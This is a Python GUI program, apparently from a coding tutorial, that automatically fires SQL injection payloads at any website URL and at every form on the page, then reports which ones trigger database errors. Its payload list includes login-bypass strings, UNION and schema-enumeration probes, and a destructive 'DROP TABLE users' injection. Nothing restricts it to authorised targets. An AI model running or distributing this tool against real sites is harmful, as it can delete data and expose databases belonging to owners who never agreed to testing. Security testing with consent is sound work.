import tkinter as tk
from tkinter import messagebox, scrolledtext, ttk
import threading
import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import logging
import time
 
 
# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)
 
 
# Initialize a session with a custom User-Agent header
session = requests.Session()
session.headers["User-Agent"] = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                "AppleWebKit/537.36 (KHTML, like Gecko) "
                                "Chrome/83.0.4103.106 Safari/537.36")
 
 
# SQL Injection error patterns
SQL_ERRORS = [
   "you have an error in your sql syntax;", "warning: mysql",
   "unclosed quotation mark after the character string",
   "quoted string not properly terminated", "odbc microsoft access driver",
   "syntax error"
]
 
 
# SQL Injection payloads
PAYLOADS = [
   "'", '"', "' OR 1=1 --", '" OR 1=1 --', "' OR 'a'='a'", '" OR "a"="a"',
   "'; DROP TABLE users; --", "' UNION SELECT NULL, version(); --",
   "' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --",
   "' OR EXISTS(SELECT 1 FROM users WHERE username='admin'); --"
]
 
 
def fetch_forms(url):
   """Fetch and return all forms from the specified URL."""
   try:
       response = session.get(url)
       response.raise_for_status()
       return bs(response.content, "html.parser").find_all("form")
   except requests.RequestException as e:
       logger.error(f"Failed to retrieve forms from {url}: {e}")
       return []
 
 
def is_vulnerable(response):
   """Check if the response contains any SQL injection error patterns."""
   return any(error in response.text.lower() for error in SQL_ERRORS)
 
 
 
 
def submit_form(url, form, payload):
   """Submit a form with a specific SQL injection payload."""
   form_data = {input_tag.get("name"): input_tag.get("value", "") + payload
   if input_tag.get("type") != "submit" else ""
                for input_tag in form.find_all("input")}
 
 
   action_url = urljoin(url, form.get("action", "").lower())
   method = form.get("method", "get").lower()
   try:
       if method == "post":
           return session.post(action_url, data=form_data)
       return session.get(action_url, params=form_data)
   except requests.RequestException as e:
       logger.error(f"Failed to submit form to {action_url}: {e}")
       return None
 
 
 
 
def sql_injection_scanner(url, output_widget, progress_bar):
   """Scan the specified URL for SQL injection vulnerabilities."""
   forms = fetch_forms(url)
   total_tests = 1 + len(forms) * len(PAYLOADS)  # 1 for URL + tests for each form
   test_count = 0
   vulnerabilities_found = False
 
 
   output_text.insert(tk.END, f"Starting scan on {url}\n", "info")
 
 
   # Test the URL itself with all payloads
   for payload in PAYLOADS:
       test_url = f"{url}{payload}"
       output_text.insert(tk.END, f"Testing URL: {test_url}\n", "info")
       test_count += 1
       progress_bar['value'] = (test_count / total_tests) * 100
 
 
       try:
           response = session.get(test_url)
           if is_vulnerable(response):
               output_text.insert(tk.END, f"Vulnerability found in URL: {test_url}\n", "vulnerable")
               vulnerabilities_found = True
               break
       except requests.RequestException as e:
           output_text.insert(tk.END, f"Error testing URL {test_url}: {e}\n", "error")
           continue
 
 
   # Test forms on the webpage
   for form in forms:
       action = form.get("action", "").lower()
       output_text.insert(tk.END, f"Testing form with action: {action}\n", "info")
 
 
       for payload in PAYLOADS:
           response = submit_form(url, form, payload)
           test_count += 1
           progress_bar['value'] = (test_count / total_tests) * 100
 
 
           if response and is_vulnerable(response):
               output_text.insert(tk.END, f"Vulnerability found in form: {action}\n", "vulnerable")
               vulnerabilities_found = True
               break
           time.sleep(0.1)  # Short delay to mimic human interaction
 
 
   # Summary and Save Results
   summary = "Vulnerabilities were detected." if vulnerabilities_found else "No vulnerabilities detected."
   output_text.insert(tk.END, f"{summary}\n", "summary")
   with open("scan_results.txt", "w") as file:
       file.write(output_text.get(1.0, tk.END))
   output_text.insert(tk.END, "Scan results saved to scan_results.txt\n", "info")
 
 
   progress_bar['value'] = 0  # Reset progress bar
 
 
 
 
def start_scan():
   url = url_entry.get().strip()
   if not url:
       messagebox.showerror("Error", "Please enter a valid URL.")
       return
   output_text.delete(1.0, tk.END)
   threading.Thread(target=sql_injection_scanner, args=(url, output_text, progress_bar)).start()
 
 
 
 
# Initialize the Tkinter root window
root = tk.Tk()
root.title("SQL Injection Scanner - The Pycodes")
 
 
# URL Entry
tk.Label(root, text="Enter URL:").grid(row=0, column=0, padx=10, pady=10)
url_entry = tk.Entry(root, width=50)
url_entry.grid(row=0, column=1, padx=10, pady=10)
 
 
# Start Scan Button
scan_button = tk.Button(root, text="Start Scan", command=start_scan)
scan_button.grid(row=0, column=2, padx=10, pady=10)
 
 
# Progress Bar
progress_bar = ttk.Progressbar(root, orient='horizontal', mode='determinate', length=400)
progress_bar.grid(row=1, column=0, columnspan=3, padx=10, pady=10)
 
 
# Output Text Widget
output_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=100, height=30)
output_text.grid(row=2, column=0, columnspan=3, padx=10, pady=10)
 
 
# Text Widget Tags for Formatting
output_text.tag_config("info", foreground="blue")
output_text.tag_config("vulnerable", foreground="red", font=("Helvetica", 12, "bold"))
output_text.tag_config("error", foreground="orange")
output_text.tag_config("summary", foreground="green", font=("Helvetica", 12, "bold"))
 
 
# Start the Tkinter main loop
root.mainloop()
